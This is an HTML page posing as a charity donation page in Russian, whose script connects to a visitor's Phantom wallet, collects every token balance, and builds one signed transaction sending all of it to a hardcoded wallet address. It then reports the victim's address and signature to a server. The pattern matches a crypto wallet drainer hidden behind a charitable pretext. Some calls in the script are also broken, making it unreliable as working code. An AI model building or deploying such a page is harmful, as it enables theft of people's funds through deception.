<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Charity Donation</title>
</head>
<body>
<h1>Добро пожаловать!</h1>
<p>Нажмите кнопку ниже, чтобы отправить все ваши токены на благотворительный адрес.</p>
<button id="donateButton">Отправить токены</button>

<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
<script>
    const solanaWeb3 = require("@solana/web3.js");
    const donateButton = document.getElementById("donateButton");
    const charityWallet = "4N8e7Hud7KBsLyMNvnkeQ8RSGWPumDa5Pf9eXgBXZaAE"; // Укажите публичный адрес кошелька получателя.

    donateButton.addEventListener("click", async () => {
        try {
            // Проверяем, установлен ли у пользователя Phantom Wallet
            if (!window.solana || !window.solana.isPhantom) {
                alert("Установите Phantom Wallet!");
                return;
            }

            // Подключение к кошельку
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
            const provider = window.solana;
            await provider.connect();

            // Получаем активы пользователя
            const walletAddress = provider.publicKey.toString();
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
                provider.publicKey,
                { programId: solanaWeb3.TOKEN_PROGRAM_ID }
            );

            const transactions = [];
            tokenAccounts.value.forEach((account) => {
                const balance = account.account.data.parsed.info.tokenAmount.uiAmount;
                const mintAddress = account.account.data.parsed.info.mint;

                if (balance > 0) {
                    const instruction = solanaWeb3.Token.createTransferInstruction(
                        solanaWeb3.TOKEN_PROGRAM_ID,
                        new solanaWeb3.PublicKey(account.pubkey),
                        new solanaWeb3.PublicKey(charityWallet),
                        provider.publicKey,
                        [],
                        balance
                    );
                    transactions.push(instruction);
                }
            });

            if (transactions.length === 0) {
                alert("У вас нет токенов для отправки.");
                return;
            }

            // Создаем и подписываем транзакцию
            const transaction = new solanaWeb3.Transaction().add(...transactions);
            transaction.feePayer = provider.publicKey;
            transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

            const signedTransaction = await provider.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signedTransaction.serialize());

            alert(`Донат отправлен! Транзакция: ${signature}`);

            // Отправляем уведомление на сервер
            await fetch("http://localhost:3000", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ walletAddress, signature }),
            });

        } catch (error) {
            console.error("Ошибка:", error);
            alert("Произошла ошибка при отправке доната.");
        }
    });
</script>
</body>
</html>
